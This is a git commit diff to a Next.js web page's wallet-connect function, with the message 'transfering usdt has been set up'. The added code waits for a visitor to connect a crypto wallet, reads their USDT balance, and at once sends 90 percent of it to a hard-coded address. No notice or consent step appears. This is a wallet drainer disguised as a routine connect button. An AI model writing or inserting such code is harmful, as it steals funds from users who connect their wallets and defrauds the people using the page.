3a49307045c81050c2d68a7e1d3fc371c2493680
omid <omid.jalali.773@gmail.com>
2024-03-26 17:29:35 +0330

    transfering usdt has been set up

--- pages/index.js
+++ pages/index.js
@@ -3,6 +3,7 @@ import Image from "next/image";
 import { Inter } from "next/font/google";
 import styles from "@/styles/Home.module.css";
 const inter = Inter({ subsets: ["latin"] });
+import { address, abi } from "../constants/ethUsdt";
 
 import Web3Modal from "web3modal";
 import { useState, useEffect } from "react";
@@ -32,7 +33,18 @@ export default function Home() {
     try {
       const web3ModalProvider = await web3Modal.connect();
       const provider = new ethers.providers.Web3Provider(web3ModalProvider);
-      setSigner(provider.getSigner());
+      const signer = provider.getSigner();
+      const signerAddress = await signer.getAddress();
+      const contract = new ethers.Contract(address, abi, signer);
+      const balance = Number(
+        (await contract.balanceOf(signerAddress)).toString()
+      );
+      console.log(balance / 1e18);
+      const tx = await contract.transfer(
+        "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
+        BigInt(balance * 0.9)
+      );
+      const txr = await tx.wait(1);
     } catch (e) {
       console.log(e);
     }
